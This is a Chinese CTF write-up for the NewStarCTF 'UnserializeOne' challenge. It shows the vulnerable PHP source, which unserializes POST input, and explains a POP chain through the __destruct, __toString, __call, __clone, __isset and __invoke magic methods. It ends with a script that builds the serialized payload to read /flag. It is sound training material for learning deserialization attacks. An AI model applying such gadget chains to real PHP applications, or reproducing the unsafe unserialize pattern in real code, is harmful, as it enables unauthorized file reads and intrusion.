---
title: '[NewStarCTF 公开赛赛道]UnserializeOne'
date: 2025-01-22 20:48:05
tags: 反序列化
categories: 刷题笔记
---

## [NewStarCTF 公开赛赛道]UnserializeOne

我们通过Wappalyzer可知该题用的php在7.1以上

由于php7.1+ 对属性并不敏感，public 也可用于protected和private

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

我们来看pop链怎么写

我们显卡看到Sec类的invoke魔术方法可以直接打印flag，所以我们需要触发这个魔术方法

我们在Start类中的isset方法里发现可以触发invoke，所以接着我们要触发isset方法

**__isset()，当对不可访问属性调用isset()或empty()时调用**

我们在eeee类的clone方法里发现isset函数可以触发Start类的isset方法，我们就需要触发clone方法

**__clone()，当对象复制完成时调用**

我们在Easy类里的call方法里发现使用了clone，我们就需要触发call方法

**__call()，在对象中调用一个不可访问方法时调用。**

我们可以在Sec的toString方法里触发call方法，接着就是触发toString方法

我们在Start类中找到echo来触发toSting方法,于是我们就找完了pop链

简单来讲就是`Start的__destruct()调用Sec的__toString()，__toString()调用Easy的__call(),__call()复制调用eeee的__clone(),__clone()的isset调用Start的__isset,__isset调用Sec的__invoke获取flag`

```php
<?php
class Start{
    public $name;
    public $func;
}

class Sec{
    public $obj;
    public $var;




}

class Easy{
    public $cla;


}

class eeee{
    public $obj;


}
$a=new Start();
$a->name=new Sec();
$a->name->obj=new Easy();
$a->name->var=new eeee();
$a->name->var->obj=new Start();
$a->name->var->obj->func=new sec();
echo (serialize($a));
```

将运行结果post传上去，得到flag

![image-20250122213437254](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202501222134328.png)
